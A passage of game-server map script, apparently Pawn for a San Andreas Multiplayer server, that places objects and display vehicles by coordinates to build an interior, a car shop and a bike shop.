	CreateSObject(2365, -3318.36108, 526.24567, 1001.13098,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2369, -3318.19067, 525.20129, 1001.12952,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(19378, -3306.45728, 523.68610, 999.48541,   90.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(19423, -3312.15894, 528.21460, 1001.77802,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(19378, -3306.61084, 523.47168, 1004.27972,   0.00000, 90.00000, 0.00000,object_show_distance,1);
	CreateSObject(2028, -3307.93970, 528.19067, 1000.58197,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(1790, -3306.68750, 528.21704, 1000.71442,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(1790, -3306.68896, 528.21698, 1000.57001,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(1790, -3306.68750, 528.21698, 1000.85999,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2028, -3307.37646, 528.19000, 1000.58197,   0.00000, 0.00000, -0.06000,object_show_distance,1);
	CreateSObject(2239, -3308.81201, 528.23608, 1000.20715,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2239, -3314.30151, 528.25592, 1000.20715,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2468, -3307.71313, 528.46863, 1001.31183,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2466, -3319.73975, 524.35309, 1002.42603,   0.00000, 0.00000, 91.07190,object_show_distance,1);
	CreateSObject(2466, -3319.76392, 521.49078, 1001.73102,   0.00000, 0.00000, 91.07190,object_show_distance,1);
	CreateSObject(2465, -3319.88745, 523.31873, 1003.56262,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2464, -3320.10352, 524.01642, 1001.72900,   0.00000, 0.00000, 228.03320,object_show_distance,1);
	CreateSObject(2464, -3320.05103, 522.27954, 1002.42999,   0.00000, 0.00000, 296.91751,object_show_distance,1);
	CreateSObject(2241, -3319.25757, 519.04138, 1000.71930,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(0, -3315.79346, 523.37732, 1001.68799,   0.00000, 0.00000, -0.12000,object_show_distance,1);
	CreateSObject(2002, -3319.54272, 525.43280, 1000.20880,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(0, -3318.82983, 522.15259, 1010.40167,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2196, -3318.51660, 522.70258, 1001.12903,   0.00000, 0.00000, 121.45046,object_show_distance,1);
	CreateSObject(18871, -3317.96558, 522.60437, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18867, -3317.75562, 523.41492, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18874, -3317.76953, 524.10980, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(18873, -3317.75659, 524.43018, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(18872, -3317.76440, 524.78998, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(18870, -3317.77246, 525.12988, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(2886, -3317.83716, 525.97113, 1000.52301,   270.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2886, -3317.83716, 525.97113, 1000.79999,   270.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(19378, -3315.94336, 528.78870, 1002.52789,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(19424, -3312.66089, 528.21027, 1001.77802,   0.00000, 0.00000, 0.06000,object_show_distance,1);
	CreateSObject(19422, -3313.16162, 528.21289, 1001.77802,   0.00000, 0.00000, 0.06000,object_show_distance,1);
	CreateSObject(19421, -3313.64282, 528.22498, 1001.77802,   0.00000, 0.00000, 0.12000,object_show_distance,1);
	CreateSObject(330, -3315.68726, 523.90491, 1001.26703,   90.00000, 0.00000, 299.05826,object_show_distance,1);
	CreateSObject(330, -3316.06909, 524.10443, 1001.26703,   90.00000, 0.00000, 355.66263,object_show_distance,1);
	CreateSObject(330, -3315.68018, 523.42133, 1000.29999,   90.00000, 0.00000, 231.84360,object_show_distance,1);
	CreateSObject(330, -3316.05518, 523.24493, 1001.26703,   90.00000, 0.00000, 177.21394,object_show_distance,1);
	CreateSObject(330, -3318.17383, 524.21606, 1000.59430,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3316.41187, 523.39758, 1001.26703,   90.00000, 0.00000, 124.19743,object_show_distance,1);
	CreateSObject(2886, -3313.61475, 528.41205, 1001.28998,   270.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2886, -3312.91138, 528.41382, 1001.28998,   270.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2886, -3312.22729, 528.43347, 1001.28998,   270.00000, 0.00000, -0.12000,object_show_distance,1);
	CreateSObject(2886, -3311.27148, 528.32043, 1001.28998,   270.00000, 0.00000, -0.12000,object_show_distance,1);
	CreateSObject(2886, -3310.52930, 528.31952, 1001.28998,   270.00000, 0.00000, -0.36000,object_show_distance,1);
	CreateSObject(2886, -3309.82886, 528.32037, 1001.28998,   270.00000, 0.00000, -0.12000,object_show_distance,1);
	CreateSObject(19423, -3311.38086, 528.13898, 1001.77802,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(19424, -3310.81714, 528.12030, 1001.77802,   0.00000, 0.00000, 0.06000,object_show_distance,1);
	CreateSObject(19422, -3310.23511, 528.09412, 1001.77802,   0.00000, 0.00000, 0.06000,object_show_distance,1);
	CreateSObject(19421, -3309.72925, 528.07422, 1001.77802,   0.00000, 0.00000, 0.12000,object_show_distance,1);
	CreateSObject(1234, -3318.49976, 528.71783, 1001.28198,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2385, -3314.71582, 518.67645, 1001.53864,   0.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(2232, -3307.21875, 520.50385, 1001.09998,   0.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(2232, -3307.19678, 525.47693, 1001.09998,   0.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(2232, -3311.35938, 525.43481, 1001.09998,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2232, -3311.34131, 520.50183, 1001.09998,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2468, -3307.01123, 528.46649, 1001.31183,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2385, -3316.88281, 518.68188, 1001.53857,   0.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(2385, -3314.71582, 518.67645, 1000.20001,   0.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(2385, -3316.88281, 518.68195, 1000.20001,   0.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(330, -3316.45947, 523.83276, 1001.26703,   90.00000, 0.00000, 57.45492,object_show_distance,1);
	CreateSObject(330, -3317.70947, 525.88605, 1001.10999,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.72144, 526.13519, 1001.10999,   90.00000, 0.00000, -89.94000,object_show_distance,1);
	CreateSObject(330, -3317.72754, 526.35510, 1001.10999,   90.00000, 0.00000, -90.06000,object_show_distance,1);
	CreateSObject(1506, -3306.71289, 522.15955, 1000.17688,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2202, -3323.98267, 520.06158, 1000.19745,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2611, -3324.45435, 519.78992, 1002.07825,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2605, -3324.03394, 519.66437, 1000.53998,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(330, -3315.68018, 523.42126, 1001.26703,   90.00000, 0.00000, 231.84360,object_show_distance,1);
	CreateSObject(330, -3316.39551, 523.30804, 1000.29999,   90.00000, 0.00000, 141.84360,object_show_distance,1);
	CreateSObject(330, -3316.42822, 523.94629, 1000.29999,   90.00000, 0.00000, 51.84360,object_show_distance,1);
	CreateSObject(330, -3315.82031, 524.03864, 1000.29999,   90.00000, 0.00000, 319.77161,object_show_distance,1);
	CreateSObject(18871, -3317.76147, 522.66998, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18870, -3317.93311, 521.26117, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18869, -3317.91016, 521.96100, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18868, -3317.79370, 523.47589, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18867, -3317.78101, 524.06207, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18873, -3317.80640, 525.17542, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(330, -3317.78564, 525.03778, 1000.49481,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.70410, 525.63507, 1001.10999,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.76563, 524.21771, 1000.49481,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.76563, 524.49786, 1000.49481,   90.00000, 0.00000, -90.36000,object_show_distance,1);
	CreateSObject(330, -3317.76538, 523.51581, 1000.49481,   90.00000, 0.00000, -89.76000,object_show_distance,1);
	CreateSObject(330, -3317.76538, 523.85577, 1000.49481,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.74780, 522.71393, 1000.49481,   90.00000, 0.00000, -89.76000,object_show_distance,1);
	CreateSObject(330, -3317.75610, 522.55408, 1000.49481,   90.00000, 0.00000, -89.76000,object_show_distance,1);
	CreateSObject(330, -3317.77075, 521.31067, 1000.49481,   90.00000, 0.00000, -89.70000,object_show_distance,1);
	CreateSObject(330, -3317.75610, 522.55408, 1000.49481,   90.00000, 0.00000, -89.76000,object_show_distance,1);
	CreateSObject(330, -3317.75854, 521.83209, 1000.49481,   90.00000, 0.00000, -89.70000,object_show_distance,1);
	CreateSObject(2252, -3309.71021, 523.37512, 1001.00000,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2252, -3309.74023, 522.51465, 1001.00000,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2252, -3308.74365, 523.36481, 1001.00000,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2252, -3308.84131, 522.47668, 1001.00000,   0.00000, 0.00000, 0.12000,object_show_distance,1);
	// Special Car Shop
	CreateSObject(19378, 1621.92322, 593.41443, 5.81710,   90.00000, 0.00000, 0.00000);
	CreateSObject(19378, 1621.91003, 580.55463, 5.81710,   90.00000, 0.00000, 0.00000);
	CreateSObject(19378, 1634.60095, 593.42859, 5.81710,   90.00000, 0.00000, 0.00000);
	CreateSObject(19378, 1634.60095, 582.92651, 5.81710,   90.00000, 0.00000, 0.00000);
	CreateSObject(19450, 1621.88879, 575.21753, 2.64810,   0.00000, 0.00000, 90.00000);
	CreateSObject(19450, 1634.72754, 575.21753, 2.64810,   0.00000, 0.00000, 90.00000);
	CreateSObject(19388, 1628.30969, 575.21753, 2.64810,   0.00000, 0.00000, 90.00000);
	CreateSObject(19450, 1639.45898, 570.32703, 2.64810,   0.00000, 0.00000, 0.00000);
	CreateSObject(19450, 1634.73413, 565.55591, 2.64810,   0.00000, 0.00000, 90.00000);
	CreateSObject(19450, 1625.37842, 565.56543, 2.64810,   0.00000, 0.00000, 90.00000);
	CreateSObject(19450, 1617.16272, 570.45087, 2.64810,   0.00000, 0.00000, 0.00000);
	CreateSObject(19450, 1621.89856, 565.56000, 2.64810,   0.00000, 0.00000, 90.00000);
	CreateSObject(19378, 1622.34558, 570.36493, 0.82000,   0.00000, -90.00000, 0.00000);
	CreateSObject(19378, 1632.63562, 570.36493, 0.81430,   0.00000, -90.00000, 0.00000);
	CreateSObject(19378, 1634.19727, 570.36493, 0.81000,   0.00000, -90.00000, 0.00000);
	CreateSObject(19377, 1634.16663, 570.36108, 4.31700,   0.00000, -90.00000, 0.00000);
	CreateSObject(19377, 1623.66797, 570.36108, 4.31700,   0.00000, -90.00000, 0.00000);
	CreateSObject(19377, 1622.37390, 570.37671, 4.33700,   0.00000, -90.00000, 0.00000);
	CreateSObject(18248, 1626.67749, 616.72852, 15.12211,   0.00000, 0.00000, 156.02193);
	CreateSObject(19335, 1628.10498, 572.09473, 4.83211,   11.00000, 4.00000, 0.00000);
	CreateSObject(11470, 1635.06311, 609.58191, 10.01052,   0.00000, 0.00000, 18.34989);
	CreateSObject(10838, 1626.25574, 598.81335, 22.32183,   0.00000, 0.00000, 90.00000);
	CreateSObject(3524, 1626.10339, 575.83398, 1.77548,   0.00000, 0.00000, 180.00000);
	CreateSObject(3524, 1630.40918, 575.83398, 1.77550,   0.00000, 0.00000, 180.00000);
	CreateSObject(718, 1633.80310, 576.96997, 0.00630,   0.00000, 0.00000, 180.00000);
	CreateSObject(718, 1633.80408, 583.52289, 0.00630,   0.00000, 0.00000, 180.00000);
	CreateSObject(718, 1633.68176, 590.21552, 0.00630,   0.00000, 0.00000, 180.00000);
	CreateSObject(718, 1622.80896, 590.16339, 0.00630,   0.00000, 0.00000, 180.00000);
	CreateSObject(718, 1622.79480, 583.51807, 0.00630,   0.00000, 0.00000, 180.00000);
	CreateSObject(718, 1622.83936, 576.93311, 0.00630,   0.00000, 0.00000, 180.00000);
	CreateSObject(19378, 1621.92322, 582.91528, 5.81710,   90.00000, 0.00000, 0.00000);
	CreateSObject(19378, 1634.62097, 580.54651, 5.81710,   90.00000, 0.00000, 0.00000);
	CreateSObject(1491, 1627.52649, 575.21069, 0.89270,   0.00000, 0.00000, 0.00000);
	CreateSObject(18092, 1628.05701, 567.91010, 1.39810,   0.00000, 0.00000, 0.00000);
	CreateSObject(19439, 1617.90271, 569.92853, 2.13300,   0.00000, -90.00000, 90.00000);
	CreateSObject(19439, 1617.90271, 573.41962, 2.13300,   0.00000, -90.00000, 90.00000);
	CreateSObject(19439, 1617.90002, 567.36249, 2.14000,   0.00000, -90.00000, 90.00000);
	CreateSObject(19439, 1638.59875, 573.37939, 2.13300,   0.00000, -90.00000, 90.00000);
	CreateSObject(19439, 1638.59875, 569.88672, 2.13300,   0.00000, -90.00000, 90.00000);
	CreateSObject(19439, 1638.57886, 567.33893, 2.14000,   0.00000, -90.00000, 90.00000);
	CreateSObject(1369, 1638.47205, 573.68909, 2.80890,   0.00000, 0.00000, 309.31339);
	CreateSObject(1369, 1638.47205, 571.62909, 2.80890,   0.00000, 0.00000, 309.31339);
	CreateSObject(1369, 1638.47205, 569.78912, 2.80890,   0.00000, 0.00000, 210.17709);
	CreateSObject(1369, 1638.47205, 567.78448, 2.80890,   0.00000, 0.00000, 210.17712);
	CreateSObject(1349, 1618.02258, 566.66595, 2.78930,   0.00000, 0.00000, 53.47775);
	CreateSObject(1349, 1618.02258, 568.98572, 2.78930,   0.00000, 0.00000, 52.59614);
	CreateSObject(1349, 1622.37781, 571.11969, 1.48100,   0.00000, 0.00000, 38.05600);
	CreateSObject(1349, 1618.02258, 573.28119, 2.78930,   0.00000, 0.00000, 303.74420);
	CreateSObject(1369, 1633.64014, 570.47949, 1.54065,   0.00000, 0.00000, 210.17709);
	CreateSObject(3850, 1637.79858, 573.23572, 2.61140,   0.00000, 0.00000, 0.00000);
	CreateSObject(3850, 1637.79858, 569.80298, 2.61140,   0.00000, 0.00000, 0.00000);
	CreateSObject(3850, 1637.81860, 567.38110, 2.61140,   0.00000, 0.00000, 0.00000);
	CreateSObject(3850, 1618.68616, 573.39960, 2.61140,   0.00000, 0.00000, 0.00000);
	CreateSObject(3850, 1618.68970, 570.85303, 2.61140,   0.00000, 0.00000, 0.00000);
	CreateSObject(3850, 1618.69275, 567.42078, 2.61140,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, 1633.34229, 571.44263, 1.39220,   0.00000, 0.00000, 118.71050);
	CreateSObject(2773, 1632.94263, 570.16400, 1.39220,   0.00000, 0.00000, 208.07480);
	CreateSObject(2773, 1634.61914, 571.06403, 1.39220,   0.00000, 0.00000, 206.95650);
	CreateSObject(2773, 1634.22571, 569.76062, 1.39220,   0.00000, 0.00000, 117.91804);
	CreateSObject(2773, 1622.80664, 570.24396, 1.39220,   0.00000, 0.00000, 127.76527);
	CreateSObject(2773, 1621.55786, 570.53247, 1.39220,   0.00000, 0.00000, 208.07480);
	CreateSObject(2773, 1623.10767, 571.66522, 1.39220,   0.00000, 0.00000, 208.07480);
	CreateSObject(2773, 1621.88416, 571.92279, 1.39220,   0.00000, 0.00000, 125.99980);
	CreateSObject(2512, 1624.50024, 567.20972, 3.70259,   0.00000, 0.00000, 161.85356);
	CreateSObject(2512, 1631.00085, 566.71198, 3.70259,   0.00000, 0.00000, 194.99480);
	// Bike Shop
	CreateSObject(9131, -2313.80005, -59.90000, 35.22650,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2310.19995, -59.90000, 35.22650,   0.00000, 0.00000, 270.00000);
	CreateSObject(1491, -2313.49609, -60.20018, 34.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1491, -2310.45996, -60.17600, 34.30000,   0.00000, 0.00000, 180.00000);
	CreateSObject(9131, -2313.80005, -59.90000, 37.50000,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2310.19995, -59.90000, 37.50000,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2317.60010, -59.90000, 35.30000,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2317.60010, -59.90000, 37.56000,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2305.30005, -59.90000, 35.30000,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2305.30005, -59.90000, 37.57300,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2305.30005, -53.00000, 35.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(9131, -2305.30005, -53.00000, 37.50000,   0.00000, 0.00000, 0.00000);
	CreateSObject(9131, -2309.80005, -53.00000, 35.30000,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2309.80005, -47.30000, 35.22900,   0.00000, 0.00000, 0.00000);
	CreateSObject(9131, -2317.60010, -47.30000, 35.30000,   0.00000, 0.00000, 180.00000);
	CreateSObject(9131, -2309.80005, -53.00000, 37.50000,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2309.80005, -47.30000, 37.50000,   0.00000, 0.00000, 0.00000);
	CreateSObject(9131, -2317.60010, -47.30000, 37.50000,   0.00000, 0.00000, 179.99451);
	CreateSObject(2395, -2317.66943, -56.95443, 34.39900,   270.00000, 180.00000, 90.00040);
	CreateSObject(2395, -2315.21094, -56.99400, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2312.50000, -57.00000, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2309.80005, -57.00000, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2307.10010, -57.00000, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2307.10010, -53.30000, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2309.80005, -53.30000, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2312.50000, -53.30000, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2317.89990, -47.50000, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2315.21655, -47.52290, 34.39990,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2312.50000, -49.60000, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2312.50000, -47.50000, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(1491, -2309.80005, -47.60000, 34.30000,   0.00000, 0.00000, 270.00000);
	CreateSObject(1649, -2307.67603, -60.25987, 35.90000,   0.00000, 0.00000, 180.00000);
	CreateSObject(1649, -2315.67163, -60.24396, 35.90000,   0.00000, 0.00000, 180.00000);
	CreateSObject(1649, -2309.77954, -51.04013, 36.51000,   0.00000, 90.00000, 90.00000);
	CreateSObject(9131, -2309.80005, -49.40000, 35.22900,   0.00000, 0.00000, 0.00000);
	CreateSObject(9131, -2309.80005, -49.40000, 37.50000,   0.00000, 0.00000, 0.00000);
	CreateSObject(9131, -2316.08008, -59.91200, 37.58000,   90.00000, 0.00000, 270.00000);
	CreateSObject(2395, -2317.39990, -60.20000, 34.80000,   270.00000, 180.00000, 180.00555);
	CreateSObject(2395, -2317.39990, -60.20000, 32.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2395, -2314.63599, -57.41000, 32.00800,   0.00000, 0.00000, 180.00000);
	CreateSObject(2395, -2314.10010, -60.20000, 34.26000,   0.00000, 90.00000, 90.00000);
	CreateSObject(2773, -2314.37695, -59.04940, 35.25000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1411, -2309.69995, -44.30000, 35.90000,   0.00000, 0.00000, 90.00000);
	CreateSObject(1411, -2304.10010, -41.50000, 35.90000,   0.00000, 0.00000, 0.00000);
	CreateSObject(910, -2306.69995, -52.20000, 35.60000,   0.00000, 0.00000, 180.00000);
	CreateSObject(3035, -2308.69995, -45.80000, 35.10000,   0.00000, 0.00000, 90.00000);
	CreateSObject(1449, -2306.10010, -41.90000, 34.80000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1450, -2305.60010, -42.90000, 34.90000,   0.00000, 0.00000, 275.00000);
	CreateSObject(1439, -2305.50000, -45.50000, 34.30000,   0.00000, 0.00000, 270.00000);
	CreateSObject(1369, -2305.60010, -47.00000, 34.90000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2435, -2311.45996, -53.09920, 34.40000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2434, -2312.59155, -52.93400, 34.40000,   0.00000, 0.00000, 270.00000);
	CreateSObject(2435, -2312.59033, -52.00570, 34.40000,   0.00000, 0.00000, 270.00000);
	CreateSObject(2412, -2313.19995, -59.00000, 34.35000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2412, -2310.10010, -59.00000, 34.35000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2369, -2311.05176, -52.75805, 35.45000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2712, -2310.19995, -52.40000, 34.90000,   0.00000, 0.00000, 280.00000);
	CreateSObject(2395, -2318.69995, -50.60000, 34.79990,   270.00000, 179.99451, 90.01100);
	CreateSObject(2395, -2315.89990, -57.00000, 32.00000,   0.00000, 0.00000, 89.99451);
	CreateSObject(2395, -2315.89990, -53.35099, 32.00000,   0.00000, 0.00000, 89.99451);
	CreateSObject(2395, -2316.43994, -50.06300, 32.00000,   0.00000, 0.00000, 179.99451);
	CreateSObject(2190, -2312.76416, -48.89835, 35.45000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2186, -2310.30005, -50.30000, 34.40000,   0.00000, 0.00000, 270.00000);
	CreateSObject(2713, -2310.50000, -52.50000, 34.50000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2714, -2311.98853, -60.32596, 37.48926,   0.00000, 0.00000, 0.00000);
	CreateSObject(15038, -2310.50000, -53.90000, 35.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2811, -2315.58569, -56.88776, 34.40000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2245, -2312.39990, -52.90000, 35.70000,   0.00000, 0.00000, 0.00000);
	CreateSObject(9131, -2313.81909, -59.90650, 38.33000,   90.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2311.55151, -59.90223, 38.33000,   90.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2309.27881, -59.90107, 38.33000,   90.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2307.02637, -59.89886, 38.33000,   90.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2316.08008, -59.91202, 38.33000,   90.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2313.81934, -59.90430, 37.58000,   90.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2311.55151, -59.90220, 37.58000,   90.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2309.27881, -59.90110, 37.58000,   90.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2307.02637, -59.89890, 37.58000,   90.00000, 0.00000, 270.00000);
	CreateSObject(19380, -2312.92114, -55.46080, 38.70480,   0.00000, 90.00000, 0.00000);
	CreateSObject(2395, -2315.21191, -51.24620, 34.39990,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2315.21289, -53.31210, 34.40000,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2316.07178, -51.17805, 34.39900,   270.00000, 179.99451, 90.00000);
	CreateSObject(2395, -2317.90088, -53.25200, 34.39990,   270.00000, 179.99451, 90.00000);
	CreateSObject(19380, -2302.43921, -55.45540, 38.70480,   0.00000, 90.00000, 0.00000);
	CreateSObject(19380, -2312.81982, -51.59050, 38.70000,   0.00000, 90.00000, 0.00000);
	CreateSObject(1649, -2309.77954, -51.04010, 36.51000,   0.00000, 90.00000, 270.00000);
	CreateSObject(1649, -2315.67163, -60.24400, 35.90000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2395, -2318.69946, -54.26001, 34.80000,   270.00000, 180.00000, 90.01102);
	CreateSObject(19458, -2320.39819, -56.99950, 36.15000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -2320.39819, -50.63860, 37.55000,   0.00000, 90.00000, 90.00000);
	CreateSObject(2435, -2312.59033, -51.08380, 34.40000,   0.00000, 0.00000, 270.00000);
	CreateSObject(2435, -2312.59033, -50.15990, 34.40000,   0.00000, 0.00000, 270.00000);
	CreateSObject(2435, -2312.59033, -49.24530, 34.40000,   0.00000, 0.00000, 270.00000);
	CreateSObject(2435, -2310.52881, -53.09920, 34.40000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19378, -2315.27979, -47.05650, 33.97000,   90.00000, 0.00000, 90.00000);
	CreateSObject(1649, -2307.67603, -60.25990, 35.90000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19378, -2304.18628, -52.77910, 33.97000,   90.00000, 0.00000, 90.00000);
	CreateSObject(19378, -2304.94653, -54.96670, 33.97000,   90.00000, 0.00000, 0.00000);
	CreateSObject(19458, -2320.39819, -53.71040, 36.85000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19447, -2301.94751, -57.75296, 35.80000,   0.00000, 90.00000, 90.00000);
	CreateSObject(2395, -2309.69580, -59.51460, 31.50000,   0.00000, 270.00000, 270.00000);
	CreateSObject(2395, -2309.16113, -59.51229, 34.80000,   270.00000, 180.00000, 180.00555);
	CreateSObject(2395, -2305.85938, -59.51431, 34.26000,   0.00000, 90.00000, 90.00000);
	CreateSObject(2395, -2306.41333, -56.71435, 32.00000,   0.00000, 0.00000, -180.00000);
	CreateSObject(2395, -2309.16455, -59.55943, 32.01400,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2316.27466, -56.21684, 35.25000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2316.30225, -53.79221, 35.25000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2316.28516, -51.31126, 35.25000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2317.22192, -50.35520, 35.25000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2315.31763, -57.70137, 35.25000,   0.00000, 0.00000, 90.00000);
	CreateSObject(19447, -2301.96753, -57.75298, 37.33440,   0.00000, 90.00000, 90.00000);
	CreateSObject(2773, -2309.79956, -54.63574, 34.86081,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2305.42090, -54.68953, 34.86081,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2306.35254, -56.07264, 34.86080,   0.00000, 0.00000, 89.57999);
	CreateSObject(2773, -2308.78296, -56.04608, 34.86080,   0.00000, 0.00000, 89.57999);
	CreateSObject(2395, -2309.10132, -54.93060, 34.35170,   -90.00000, 0.00000, 0.00000);
	CreateSObject(9131, -2306.02075, -59.90000, 37.57300,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2306.02075, -59.90000, 35.30000,   0.00000, 0.00000, 270.00000);
	CreateSObject(19447, -2301.96338, -55.12180, 38.13300,   0.00000, 90.00000, 90.00000);
	CreateSObject(19447, -2301.94678, -55.13290, 36.60000,   0.00000, 90.00000, 90.00000);
	CreateSObject(9131, -2318.34180, -59.90000, 37.56000,   0.00000, 0.00000, 270.00000);
	CreateSObject(9131, -2318.34180, -59.90000, 35.30000,   0.00000, 0.00000, 270.00000);
	CreateSObject(2422, -2312.30835, -52.15509, 35.45000,   0.00000, 0.00000, 270.00000);
	CreateViewOnlyVehicle(581, -2316.7117, -56.9245, 36.7323, 0.0000, -1, -1);
	CreateViewOnlyVehicle(522, -2316.8545, -53.7073, 37.4245, 0.0000, -1, -1);
	CreateViewOnlyVehicle(521, -2316.9580, -50.5167, 38.0294, 0.0000, -1, -1);
	CreateViewOnlyVehicle(463, -2307.7256, -54.5914, 34.8392, 90.0000, -1, -1);
	CreateViewOnlyVehicle(463, -2316.1765, -58.9616, 35.1552, -90.0000, -1, -1);
	CreateViewOnlyVehicle(468, -2305.8667, -58.1830, 36.4942, 0.0000, -1, -1);
